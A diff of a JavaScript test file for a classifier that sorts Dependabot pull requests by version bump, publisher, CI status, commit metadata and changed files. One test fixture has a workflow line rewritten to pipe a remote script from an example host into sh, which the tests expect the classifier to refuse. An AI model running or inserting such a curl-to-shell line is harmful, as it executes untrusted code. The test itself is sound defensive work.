@@ -1,168 +1,132 @@
+// The tier both lanes share. The vectors are the pr-merge lane's
+// (plugins/source-control/skills/babysit-prs/scripts/tests/test_babysit_dependabot.py,
+// classes Classify and Content), one for one, so the two lanes sort a pull
+// request the same way; the content-step and security cases are this lane's.
 import assert from "node:assert/strict";
 import { test } from "node:test";
 
-import { classify, contentReason, isMajor, isSecurityUpdate, parseConfig, usesOnly } from "./dependency-classify.mjs";
+import { classify, contentReason, contentStep, isMajor, isSecurityUpdate, parseConfig, usesOnly } from "./dependency-classify.mjs";
 
-const pr = (overrides = {}) => ({
-  author: "dependabot[bot]",
-  headRef: "dependabot/npm_and_yarn/biomejs/biome-2.3.1",
-  title: "build(deps): bump @biomejs/biome from 2.3.0 to 2.3.1",
-  body: "Bumps [@biomejs/biome](https://github.com/biomejs/biome) from 2.3.0 to 2.3.1.",
-  labels: ["dependencies"],
-  ciStatus: "success",
-  ...overrides,
+const NPM = "dependabot/npm_and_yarn/x-1.3.0";
+const ACTIONS = "dependabot/github_actions/actions/checkout-4.2.0";
+
+function metadata(...updates) {
+  const lines = ["Bumps things.", "", "---", "updated-dependencies:"];
+  for (const [name, kind, version] of updates) {
+    lines.push(`- dependency-name: ${name}`, `  dependency-version: ${version}`, "  dependency-type: direct:production");
+    if (kind !== null) lines.push(`  update-type: version-update:${kind}`);
+  }
+  lines.push("...", "", "Signed-off-by: dependabot[bot] <support@github.com>");
+  return lines.join("\n");
+}
+
+const commit = (message, { sha = "d".repeat(40), name = "dependabot[bot]", email = "49699333+dependabot[bot]@users.noreply.github.com" } = {}) => ({
+  sha,
+  commit: { message, author: { name, email } },
 });
 
-test("a patch bump of a non-actions package is auto", () => {
-  const result = classify(pr());
-  assert.equal(result.tier, "auto");
-  assert.deepEqual(result.reasons, []);
-  assert.deepEqual(result.updates, [{ name: "@biomejs/biome", from: "2.3.0", to: "2.3.1" }]);
-  assert.equal(result.ecosystem, "npm_and_yarn");
-});
+const tier = (title, { body = "", ref = NPM, ci = "success", commits = [] } = {}) =>
+  classify({ author: "dependabot[bot]", headRef: ref, title, body, labels: [], ciStatus: ci, commits });
 
 test("a pull request another author opened is not classified", () => {
-  assert.equal(classify(pr({ author: "octocat" })), null);
+  assert.equal(classify({ author: "octocat", title: "bump x from 1.0.0 to 1.0.1" }), null);
 });
 
-test("a major bump is review", () => {
-  const result = classify(pr({ title: "Bump @biomejs/biome from 2.3.0 to 3.0.0 in /plugins/miro/server" }));
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["major:@biomejs/biome"]);
-  assert.deepEqual(result.updates, [{ name: "@biomejs/biome", from: "2.3.0", to: "3.0.0" }]);
+test("a patch or 1.x minor update is auto", () => {
+  for (const title of ["bump x from 1.2.3 to 1.2.4", "build(deps): bump x from 1.2.0 to 1.3.0"]) {
+    const result = tier(title);
+    assert.deepEqual([result.tier, result.reasons], ["auto", []], title);
+  }
 });
 
-test("a v-prefixed minor bump of an allowlisted action is auto", () => {
-  const result = classify(
-    pr({
-      headRef: "dependabot/github_actions/actions/checkout-4.2.0",
-      title: "build(deps): bump actions/checkout from v4.1.0 to v4.2.0",
-    }),
-  );
-  assert.equal(result.tier, "auto");
+test("a 0.x minor update is review", () => {
+  const result = tier("Bump x from 0.3.1 to 0.4.0");
+  assert.deepEqual([result.tier, result.reasons], ["review", ["major:x"]]);
+  assert.equal(tier("Bump x from 0.3.1 to 0.3.2").tier, "auto");
 });
 
-test("an action from a publisher outside the allowlist is review", () => {
-  const result = classify(
-    pr({
-      headRef: "dependabot/github_actions/zizmorcore/zizmor-action-0.2.1",
-      title: "build(deps): bump zizmorcore/zizmor-action from 0.2.0 to 0.2.1",
-    }),
-  );
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["publisher:zizmorcore/zizmor-action"]);
+test("a major update is review", () => {
+  assert.deepEqual(tier("build(deps): bump x from 4.2.0 to 5.0.0").reasons, ["major:x"]);
 });
 
-test("a group holding one major is review, and every update is listed", () => {
-  const body = [
-    "Bumps the github-actions group with 2 updates: [a](x) and [b](y).",
-    "",
-    "Updates `actions/checkout` from 4.1.0 to 5.0.0",
-    "<details>",
-    "> Updates `actions/fake` from 1.0.0 to 1.0.1",
-    "</details>",
-    "",
-    "Updates `actions/setup-node` from 6.0.0 to 6.1.0",
-  ].join("\n");
-  const result = classify(
-    pr({
-      headRef: "dependabot/github_actions/github-actions-abc123",
-      title: "build(deps): bump the github-actions group with 2 updates",
-      body,
-    }),
-  );
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["major:actions/checkout"]);
-  assert.deepEqual(
-    result.updates.map((update) => update.name),
-    ["actions/checkout", "actions/setup-node"],
-  );
+test("an unreadable title or version is review", () => {
+  assert.deepEqual(tier("chore: tidy").reasons, ["unparsed-updates"]);
+  assert.deepEqual(tier("bump x from 0a1b2c3d4e5f to 9f8e7d6c5b4a").reasons, ["unparsed-version:x"]);
 });
 
-test("a group whose listed updates do not match its count is review", () => {
-  const result = classify(
-    pr({
-      title: "Bump the npm-minor-patch group across 1 directory with 3 updates",
-      body: "Updates `a` from 1.0.0 to 1.0.1\nUpdates `b` from 2.0.0 to 2.1.0",
-    }),
-  );
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["unparsed-group"]);
+test("a group with one major entry is review", () => {
+  const body =
+    "Updates `actions/checkout` from 4.1.0 to 4.2.0\n" +
+    "Updates `actions/setup-node` from 6.0.0 to 7.0.0\n" +
+    "Updates `github/codeql-action` from 3.1.0 to 3.1.1\n";
+  const result = tier("build: Bump the vendor-actions group across 1 directory with 3 updates", { body, ref: ACTIONS });
+  assert.deepEqual(result.reasons, ["major:actions/setup-node"]);
 });
 
-test("a title with no from and to is review", () => {
-  const result = classify(pr({ title: "Update everything" }));
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["unparsed-title"]);
-});
-
-test("a SHA-to-SHA bump is review", () => {
-  const from = "a".repeat(40);
-  const to = "b".repeat(40);
-  const result = classify(pr({ title: `Bump actions/checkout from ${from} to ${to}` }));
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["unparsed-version:actions/checkout"]);
-});
-
-test("a red ci-status makes any bump review; pending does not", () => {
-  assert.deepEqual(classify(pr({ ciStatus: "failure" })).reasons, ["ci-status-red"]);
-  assert.deepEqual(classify(pr({ ciStatus: "timed_out" })).reasons, ["ci-status-red"]);
-  assert.equal(classify(pr({ ciStatus: "pending" })).tier, "auto");
-  assert.equal(classify(pr({ ciStatus: "" })).tier, "auto");
-});
-
-test("a 0.x minor bump is review; a 1.x minor bump is auto", () => {
-  assert.deepEqual(classify(pr({ title: "bump x from 0.2.0 to 0.3.0" })).reasons, ["major:x"]);
-  assert.equal(classify(pr({ title: "bump x from 0.2.0 to 0.2.5" })).tier, "auto");
-  assert.equal(classify(pr({ title: "bump x from 1.2.0 to 1.3.0" })).tier, "auto");
-});
-
-const metadata = (rows) =>
-  [
-    "build(deps): bump x",
-    "",
-    "---",
-    "updated-dependencies:",
-    ...rows.flatMap(([name, version, type]) => [
-      `- dependency-name: ${name}`,
-      `  dependency-version: ${version}`,
-      "  dependency-type: direct:production",
-      `  update-type: version-update:semver-${type}`,
-    ]),
-    "...",
-    "",
-    "Signed-off-by: dependabot[bot] <support@github.com>",
-  ].join("\n");
-
-test("the verified commit's metadata agreeing with the title keeps the title's tier", () => {
-  const result = classify(pr({ commitMessage: metadata([["@biomejs/biome", "2.3.1", "patch"]]) }));
-  assert.equal(result.tier, "auto");
-  assert.deepEqual(result.reasons, []);
-});
-
-test("metadata naming a major makes the bump review", () => {
-  const result = classify(pr({ commitMessage: metadata([["@biomejs/biome", "2.3.1", "major"]]) }));
-  assert.deepEqual(result.reasons, ["major:@biomejs/biome"]);
-});
-
-test("metadata that disagrees with the title is review", () => {
-  assert.deepEqual(classify(pr({ commitMessage: metadata([["other", "2.3.1", "patch"]]) })).reasons, ["metadata-disagrees"]);
-  assert.deepEqual(classify(pr({ commitMessage: metadata([["@biomejs/biome", "2.4.0", "minor"]]) })).reasons, [
-    "metadata-disagrees",
+test("a group whose lines do not add up is review", () => {
+  assert.deepEqual(tier("bump the g group with 3 updates", { body: "Updates `a` from 1.0.0 to 1.0.1\n" }).reasons, [
+    "unparsed-updates",
   ]);
 });
 
-test("metadata alone classifies when the title is unreadable", () => {
-  const result = classify(pr({ title: "Update everything", commitMessage: metadata([["x", "1.2.3", "minor"]]) }));
-  assert.equal(result.tier, "auto");
-  assert.deepEqual(result.updates, [{ name: "x", from: null, to: "1.2.3", type: "minor" }]);
+test("an actions update from an unlisted publisher is review", () => {
+  assert.equal(tier("bump actions/checkout from 4.1.0 to 4.2.0", { ref: ACTIONS }).tier, "auto");
+  assert.deepEqual(tier("bump someone/action from 1.0.0 to 1.1.0", { ref: ACTIONS }).reasons, ["publisher:someone/action"]);
+  assert.equal(tier("bump someone/pkg from 1.0.0 to 1.1.0").tier, "auto", "outside github_actions the publisher is not read");
 });
 
-test("major means the first numeric component changed, or the second for 0.x", () => {
+test("a red ci-status is review and a running one is not", () => {
+  for (const ci of ["action_required", "cancelled", "failure", "startup_failure", "timed_out"]) {
+    assert.ok(tier("bump x from 1.0.0 to 1.0.1", { ci }).reasons.includes("ci-status-red"), ci);
+  }
+  assert.equal(tier("bump x from 1.0.0 to 1.0.1", { ci: "pending" }).tier, "auto");
+});
+
+test("metadata is read and must agree with the title", () => {
+  const minor = commit(metadata(["x", "semver-minor", "1.3.0"]));
+  assert.equal(tier("bump x from 1.2.0 to 1.3.0", { commits: [minor] }).tier, "auto");
+  assert.equal(tier("bump x", { commits: [minor] }).tier, "auto", "metadata alone, when the title names nothing");
+  const major = commit(metadata(["x", "semver-major", "2.0.0"]));
+  assert.deepEqual(tier("bump x", { commits: [major] }).reasons, ["major:x"]);
+  const result = tier("bump x from 1.9.0 to 2.0.0", { commits: [minor] });
+  assert.equal(result.tier, "review");
+  assert.ok(result.reasons.includes("sources-disagree"), "metadata calling a 1.x jump minor disagrees with a title reading major");
+  const other = commit(metadata(["y", "semver-patch", "1.0.1"]));
+  assert.ok(tier("bump x from 1.0.0 to 1.0.1", { commits: [other] }).reasons.includes("sources-disagree"));
+});
+
+test("a 0.x minor in the metadata is major", () => {
+  assert.deepEqual(tier("bump x", { commits: [commit(metadata(["x", "semver-minor", "0.4.0"]))] }).reasons, ["major:x"]);
+  assert.deepEqual(tier("bump x", { commits: [commit(metadata(["x", null, "1.3.0"]))] }).reasons, ["unparsed-version:x"]);
+});
+
+test("real group metadata and body agree", () => {
+  const message = metadata(
+    ["actions/create-github-app-token", "semver-minor", "3.3.0"],
+    ["actions/setup-node", "semver-minor", "7.1.0"],
+    ["anthropics/claude-code-action", "semver-patch", "1.0.248"],
+  );
+  const body =
+    "Updates `actions/create-github-app-token` from 3.2.0 to 3.3.0\n" +
+    "Updates `actions/setup-node` from 7.0.0 to 7.1.0\n" +
+    "Updates `anthropics/claude-code-action` from 1.0.247 to 1.0.248\n";
+  const result = tier("build: Bump the vendor-actions group across 1 directory with 3 updates", {
+    body,
+    ref: ACTIONS,
+    commits: [commit(message)],
+  });
+  assert.deepEqual([result.tier, result.updates.length], ["auto", 3]);
+});
+
+test("metadata from a commit another author wrote is not read", () => {
+  const forged = commit(metadata(["x", "semver-patch", "2.0.0"]), { name: "someone", email: "someone@example.test" });
+  assert.deepEqual(tier("bump x from 1.0.0 to 2.0.0", { commits: [forged] }).reasons, ["major:x"]);
+});
+
+test("major means the first numeric component changed, or the second below 1.0", () => {
   assert.equal(isMajor("1.9.9", "2.0.0"), true);
   assert.equal(isMajor("0.2.0", "0.3.0"), true);
   assert.equal(isMajor("0.2.0", "0.2.9"), false);
-  assert.equal(isMajor("1.2.0", "1.3.0"), false);
   assert.equal(isMajor("v6", "v7"), true);
   assert.equal(isMajor("4.1", "4.2.0-rc.1"), false);
   assert.equal(isMajor("main", "4.2.0"), null);
@@ -174,110 +138,139 @@ test("a security update is the security label or an advisory in the body", () =>
   assert.equal(isSecurityUpdate({ labels: [], body: "Patches CVE-2026-12345" }), true);
   assert.equal(isSecurityUpdate({ labels: [], body: "See the security advisory." }), true);
   assert.equal(isSecurityUpdate({ labels: ["dependencies"], body: "Bumps x." }), false);
+  assert.equal(classify({ author: "dependabot[bot]", title: "bump x from 1.0.0 to 1.0.1", labels: ["security"] }).security, true);
 });
 
-test("the classification carries the security flag", () => {
-  assert.equal(classify(pr({ labels: ["security"] })).security, true);
-  assert.equal(classify(pr()).security, false);
-});
-
-// The content rule, as the pr-merge lane applies it (babysit_dependabot.py,
-// content_refusal), against a config shaped like this repository's.
-const CONFIG = parseConfig(
+// Content: the pr-merge lane's Content class.
+const CONFIG_PAIRS = parseConfig(
   [
     "version: 2",
     "updates:",
     "  - package-ecosystem: github-actions",
     "    directory: /",
+    "    groups:",
+    "      vendor-actions:",
+    "        patterns:",
+    "          - actions/*",
     "  - package-ecosystem: npm",
-    "    directory: /",
-    "  - package-ecosystem: npm",
-    "    directories:",
-    '      - "/plugins/miro/server"',
-    "      - /plugins/*/scripts",
+    '    directory: "/plugins/miro/server"',
     "  - package-ecosystem: pip",
-    "    directory: /plugins/animation",
+    "    directories:",
+    "      - /plugins/speech",
+    '      - "/.github" # the CI toolchain',
+    "",
   ].join("\n"),
 );
-const usesPin = "@@ -10 +10 @@\n-      - uses: actions/checkout@aaaa # v4\n+      - uses: actions/checkout@bbbb # v5";
-const withFiles = (files) => classify(pr({ files, config: CONFIG }));
+const PIN =
+  "@@ -10,7 +10,7 @@ jobs:\n" +
+  "       - name: Check out\n" +
+  `-        uses: actions/checkout@${"1".repeat(40)} # v4.1.0\n` +
+  `+        uses: actions/checkout@${"2".repeat(40)} # v4.2.0\n` +
+  "         with:\n";
+const changed = (path, patch, previous) => ({
+  filename: path,
+  status: "modified",
+  ...(patch === undefined ? {} : { patch }),
+  ...(previous ? { previous_filename: previous } : {}),
+});
+const refusal = (files, extra = []) => contentReason(files, CONFIG_PAIRS, new Set(extra));
 
-test("the config reads one ecosystem and directory per entry and listed directory", () => {
-  assert.deepEqual(CONFIG, [
+test("the config reads every ecosystem and directory", () => {
+  assert.deepEqual(CONFIG_PAIRS, [
     ["github-actions", "/"],
-    ["npm", "/"],
     ["npm", "/plugins/miro/server"],
-    ["npm", "/plugins/*/scripts"],
-    ["pip", "/plugins/animation"],
+    ["pip", "/plugins/speech"],
+    ["pip", "/.github"],
   ]);
-  assert.equal(parseConfig("version: 2\n"), null, "no updates: key is unreadable");
-  assert.deepEqual(parseConfig("version: 2\nupdates: []\n"), [], "an updates: key with no entry is an empty config");
+  assert.equal(parseConfig("version: 2\n"), null);
 });
 
-test("a directories glob: * and ? stay in one segment, **/ spans zero or more segments", () => {
-  const covered = (path, directory) => contentReason([{ filename: path }], [["npm", directory]]) === null;
-  assert.equal(covered("plugins/x/scripts/package.json", "/plugins/*/scripts"), true);
-  assert.equal(covered("plugins/x/extra/scripts/package.json", "/plugins/*/scripts"), false, "* does not cross /");
-  assert.equal(covered("lib-a/package.json", "/lib-*"), true);
-  assert.equal(covered("lib-a/b/package.json", "/lib-*"), false);
-  assert.equal(covered("lib-ab/package.json", "/lib-?b"), true);
-  assert.equal(covered("lib-a/b/package.json", "/lib-?/b"), true);
-  assert.equal(covered("lib-/b/package.json", "/lib-?/b"), false, "? is exactly one character");
-  assert.equal(covered("package.json", "**/*"), true, "the docs' globstar covers the current layer");
-  assert.equal(covered("a/b/c/package.json", "**/*"), true, "and every layer below");
-  assert.equal(covered("plugins/x/y/scripts/package.json", "/plugins/**/scripts"), true);
-  assert.equal(covered("plugins/scripts/package.json", "/plugins/**/scripts"), true, "**/ may match no segment");
-  assert.equal(covered("plugins.x/package.json", "/plugins?x"), true);
-  assert.equal(covered("pluginsQx/package.json", "/plugins.x"), false, ". is literal");
+test("a directories glob keeps * and ? in one segment", () => {
+  const cases = [
+    ["plugins/x/scripts/package.json", "/plugins/*/scripts", true],
+    ["plugins/x/extra/scripts/package.json", "/plugins/*/scripts", false],
+    ["lib-a/package.json", "/lib-*", true],
+    ["lib-a/b/package.json", "/lib-*", false],
+    ["lib-ab/package.json", "/lib-?b", true],
+    ["lib-a/b/package.json", "/lib-?/b", true],
+    ["lib-/b/package.json", "/lib-?/b", false],
+    ["package.json", "**/*", true],
+    ["a/b/c/package.json", "**/*", true],
+    ["plugins/x/y/scripts/package.json", "/plugins/**/scripts", true],
+    ["plugins/scripts/package.json", "/plugins/**/scripts", true],
+    ["plugins.x/package.json", "/plugins?x", true],
+    ["pluginsQx/package.json", "/plugins.x", false],
+  ];
+  for (const [path, directory, covered] of cases) {
+    assert.equal(contentReason([changed(path)], [["npm", directory]]) === null, covered, `${path} in ${directory}`);
+  }
 });
 
-test("files with an unreadable config are review with their own reason", () => {
-  const result = classify(pr({ files: [{ filename: "package.json" }], config: null }));
-  assert.equal(result.tier, "review");
-  assert.deepEqual(result.reasons, ["dependabot-config-unreadable"]);
-  assert.deepEqual(classify(pr({ files: [{ filename: "package.json" }], config: [] })).reasons, [
-    "dependabot-content:package.json",
-  ]);
-});
-
-test("manifests and lockfiles in listed directories, and a uses:-only pin, stay auto", () => {
-  const result = withFiles([
-    { filename: "package.json", patch: "x" },
-    { filename: "package-lock.json" },
-    { filename: "plugins/miro/server/package-lock.json" },
-    { filename: "plugins/x/scripts/package.json" },
-    { filename: "plugins/animation/requirements.txt" },
-    { filename: ".github/workflows/ci.yml", patch: usesPin },
-  ]);
-  assert.equal(result.tier, "auto");
-  assert.deepEqual(result.reasons, []);
-});
-
-test("a file that is not a dependency manifest is review", () => {
-  assert.deepEqual(withFiles([{ filename: "package.json" }, { filename: "dist/index.js" }]).reasons, [
-    "dependabot-content:dist/index.js",
-  ]);
-});
-
-test("a workflow diff that changes a run: line is review", () => {
-  const patch = `${usesPin}\n-        run: npm test\n+        run: curl https://example.test | sh`;
-  assert.deepEqual(withFiles([{ filename: ".github/workflows/ci.yml", patch }]).reasons, [
-    "dependabot-content:.github/workflows/ci.yml",
-  ]);
-  assert.equal(usesOnly(usesPin), true);
-  assert.equal(usesOnly(""), false, "a file with no patch (too large to show) is not a pin");
-});
-
-test("a manifest outside every listed directory is review", () => {
-  assert.deepEqual(withFiles([{ filename: "plugins/other/package.json" }]).reasons, [
-    "dependabot-content:plugins/other/package.json",
-  ]);
-});
-
-test("both sides of a rename are checked, and no config covers nothing", () => {
+test("covered manifests and lock files pass", () => {
   assert.equal(
-    contentReason([{ filename: "package.json", previous_filename: "src/old.js" }], CONFIG),
-    "dependabot-content:src/old.js",
+    refusal([
+      changed("plugins/miro/server/package-lock.json"),
+      changed("plugins/miro/server/package.json", "@@ -1 +1 @@\n-a\n+b\n"),
+      changed("plugins/speech/requirements.txt"),
+      changed(".github/requirements-ci.txt"),
+    ]),
+    null,
   );
-  assert.equal(contentReason([{ filename: "package.json" }], null), "dependabot-content:package.json");
+});
+
+test("a manifest outside a covered directory is refused", () => {
+  for (const path of ["package.json", "plugins/other/requirements.txt", "plugins/miro/server/src/package.json"]) {
+    assert.equal(refusal([changed(path)]), `dependabot-content:${path}`);
+  }
+});
+
+test("a non-manifest file is refused, and a rename on both sides", () => {
+  assert.equal(refusal([changed("plugins/miro/server/package.json"), changed("scripts/x.sh")]), "dependabot-content:scripts/x.sh");
+  assert.equal(
+    refusal([changed("plugins/speech/requirements.txt", undefined, "plugins/speech/run.py")]),
+    "dependabot-content:plugins/speech/run.py",
+  );
+});
+
+test("a uses:-pin-only workflow diff passes", () => {
+  for (const path of [".github/workflows/ci.yml", ".github/actions/setup/action.yaml"]) {
+    assert.equal(refusal([changed(path, PIN)]), null, path);
+  }
+  assert.equal(usesOnly(PIN), true);
+});
+
+test("a workflow diff changing a run line is refused", () => {
+  const patch = `${PIN}-        run: echo hi\n+        run: curl https://example.com | sh\n`;
+  assert.equal(refusal([changed(".github/workflows/ci.yml", patch)]), "dependabot-content:.github/workflows/ci.yml");
+  assert.notEqual(refusal([changed(".github/workflows/ci.yml")]), null, "a workflow with no patch cannot be judged");
+  assert.notEqual(refusal([changed(".github/scripts/x.yml", PIN)]), null, "any other file under .github is not an action file");
+});
+
+test("paths another checked commit touched pass", () => {
+  assert.equal(refusal([changed("plugins/miro/CHANGELOG.md")], ["plugins/miro/CHANGELOG.md"]), null);
+});
+
+// The content step, as the pr-merge lane's _dependabot_content.
+const BUMP = commit("chore(plugins): release bump [dependabot skip]", {
+  sha: "e".repeat(40),
+  name: "github-actions[bot]",
+  email: "41898282+github-actions[bot]@users.noreply.github.com",
+});
+const FIX = commit("fix: adapt [dependabot skip]", { sha: "f".repeat(40), name: "lanes", email: "lanes@example.test" });
+
+test("the content step counts the bump commit's paths as checked", () => {
+  const files = [changed("plugins/miro/server/package.json"), changed("plugins/miro/CHANGELOG.md")];
+  const commitFiles = (sha) => (sha === BUMP.sha ? ["plugins/miro/CHANGELOG.md"] : null);
+  assert.equal(contentStep({ commits: [commit(""), BUMP], commitFiles, files, config: CONFIG_PAIRS, changedFiles: 2 }), null);
+});
+
+test("the content step's refusals and gaps are review reasons", () => {
+  const files = [changed("plugins/miro/server/package.json")];
+  const base = { files, config: CONFIG_PAIRS, changedFiles: 1 };
+  assert.equal(contentStep({ ...base, commits: [BUMP], commitFiles: () => null }), `dependabot-commit-files-unreadable:${"e".repeat(12)}`);
+  assert.equal(contentStep({ ...base, commits: [FIX], commitFiles: () => [".github/workflows/x.yml"] }), "dependabot-fix-content:.github/workflows/x.yml");
+  assert.equal(contentStep({ ...base, config: null }), "dependabot-config-unreadable");
+  assert.equal(contentStep({ ...base, changedFiles: 2 }), "dependabot-content:files-incomplete");
+  const result = classify({ author: "dependabot[bot]", headRef: NPM, title: "bump x from 1.0.0 to 1.0.1", ...base, files: [changed("dist/x.js")] });
+  assert.deepEqual([result.tier, result.reasons], ["review", ["dependabot-content:dist/x.js"]]);
 });
